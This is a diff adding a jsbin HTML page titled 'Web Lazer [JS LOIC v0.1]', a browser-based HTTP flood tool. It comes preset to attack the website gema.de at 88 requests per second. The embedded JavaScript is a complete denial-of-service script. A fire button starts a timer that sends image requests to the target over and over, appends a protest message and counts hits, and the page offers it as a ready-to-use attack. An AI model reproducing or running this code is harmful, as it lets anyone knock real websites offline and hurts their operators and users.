@@ -1,0 +1,160 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html>
+<!--
+  Created using jsbin.com
+  Source can be edited via http://jsbin.com/ekarof/2/edit
+--><head><meta content="text/html;charset=ISO-8859-1" http-equiv="Content-Type"><title>Web Lazer [JS LOIC v0.1]</title> 
+<style id="jsbin-css">
+
+</style>
+</head><body style="background-repeat: no-repeat; width: 193px; margin-top: 121px; height: 103px; color: rgb(255, 255, 255); background-color: rgb(0, 0, 0); background-image:url();" alink="#000099" link="#000099" vlink="#990099"><div style="position: absolute; width: 143px; left: 8px; top: 84px; height: 449px;"><div style="text-align: center; height: 589px;"></div><div style="position: absolute; text-align: center; left: 17px; width: 128px; top: 591px; height: 111px;"><br></div><div style="position: absolute; height: 100px; width: 240px; top: 132px; left: 302px;"><fieldset style="width: 100%; height: 100%;"><legend style="font-weight: bold;">Step 1. Select your target:</legend><label style="font-weight: bold;"><input id="targetURL" style="width: 100%;" value="http://www.gema.de:80"></label></fieldset></div><div style="width: 240px; height: 100px; position: absolute; top: 132px; left: 631px;"><fieldset style="width: 100%; height: 100%;"><legend style="font-weight: bold;">Step 2. Ready?</legend><button id="fireButton" style="border-color: rgb(255, 255, 255); background-color: rgb(50, 205, 50); color: rgb(255, 255, 255); width: 240px; height: 70px; font-weight: bold;">FEUER
+
+FREI !!!</button></fieldset></div><div style="width: 240px; position: absolute; left: 302px; top: 294px; height: 142px;"><fieldset style="width: 100%; height: 100%;"><legend style="font-weight: bold;">Optional. Options</legend><label>Requests per second: <input style="width: 40px;" id="rps" value="88"></label><br><label>Append message:<br><input style="width: 100%;" id="message" value="Knowledge Is Free"></label></fieldset></div><div style="width: 240px; position: absolute; left: 633px; height: 142px; top: 294px;"><fieldset style="width: 100%; height: 100%;"><legend style="font-weight: bold;">Attack status:</legend><dl><dt>Requested:</dt><dd id="requestedCtr">0</dd><dt style="color: rgb(51, 255, 51);">Succeeded:</dt><dd style="color: rgb(51, 255, 51);" id="succeededCtr">0</dd><dt style="color: rgb(255, 0, 0);">Failed:</dt><dd style="color: rgb(255, 0, 0);" id="failedCtr">0</dd></dl></fieldset></div></div><script>
+
+(function () {
+
+var fireInterval;
+
+var isFiring = false;
+
+var requestedCtrNode = document.getElementById("requestedCtr"),
+
+succeededCtrNode = document.getElementById("succeededCtr"),
+
+failedCtrNode = document.getElementById("failedCtr"),
+
+targetURLNode = document.getElementById("targetURL"),
+
+fireButton = document.getElementById("fireButton"),
+
+messageNode = document.getElementById("message"),
+
+rpsNode = document.getElementById("rps"),
+
+timeoutNode = document.getElementById("timeout");
+
+var targetURL = targetURLNode.value;
+
+targetURLNode.onchange = function () {
+
+targetURL = this.value;
+
+};
+
+var requestsHT = {}; // requests hash table, may come in handy later
+
+var requestedCtr = 0,
+
+succeededCtr = 0,
+
+failedCtr = 0;
+
+var makeHttpRequest = function () {
+
+if (requestedCtr > failedCtr + succeededCtr + 1000) { //Allow no more than 1000 hung requests
+
+return;
+
+};
+
+var rID =Number(new Date());
+
+var img = new Image();
+
+img.onerror = function () { onFail(rID); };
+
+img.onabort = function () { onFail(rID); };
+
+img.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
+
+img.setAttribute("src", targetURL + "?id=" + rID + "&msg=" + messageNode.value);
+
+requestsHT[rID] = img;
+
+onRequest(rID);
+
+};
+
+var onRequest = function (rID) {
+
+requestedCtr++;
+
+requestedCtrNode.innerHTML = requestedCtr;
+
+};
+
+var onComplete = function (rID) {
+
+delete requestsHT[rID];
+
+};
+
+var onFail = function (rID) {
+
+//failedCtr++;
+
+//failedCtrNode.innerHTML = failedCtr;
+
+succeededCtr++; //Seems like the url will always fail it it isn't an image
+
+succeededCtrNode.innerHTML = succeededCtr;
+
+delete requestsHT[rID]; // we can't keep it forever or it would blow up the browser
+
+};
+
+var onSuccess = function (rID) {
+
+succeededCtr++;
+
+succeededCtrNode.innerHTML = succeededCtr;
+
+delete requestsHT[rID];
+
+};
+
+fireButton.onclick = function () {
+
+if (isFiring) {
+
+clearInterval(fireInterval);
+
+isFiring = false;
+
+this.innerHTML = "IMMA CHARGING MAH LAZER";
+
+} else {
+
+isFiring = true;
+
+this.innerHTML = "Stop flooding";
+
+fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0));
+
+}
+
+};
+
+})();
+
+</script> <script>
+if (document.getElementById('hello')) {
+  document.getElementById('hello').innerHTML = 'Hello World - this was inserted using JavaScript';
+}
+</script>
+<script src="http://static.jsbin.com/js/render/edit.js"></script>
+<script>jsbinShowEdit({"root":"http://static.jsbin.com","csrf":"GZsvccVqLR3+qhO2rWmUGw6Y"});</script>
+<script src="http://static.jsbin.com/js/vendor/eventsource.js"></script>
+<script src="http://static.jsbin.com/js/spike.js"></script>
+<script>
+var _gaq = _gaq || [];
+_gaq.push(['_setAccount', 'UA-1656750-34']);
+_gaq.push(['_trackPageview']);
+
+(function() {
+  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ga);
+})();
+</script>
+</body></html>
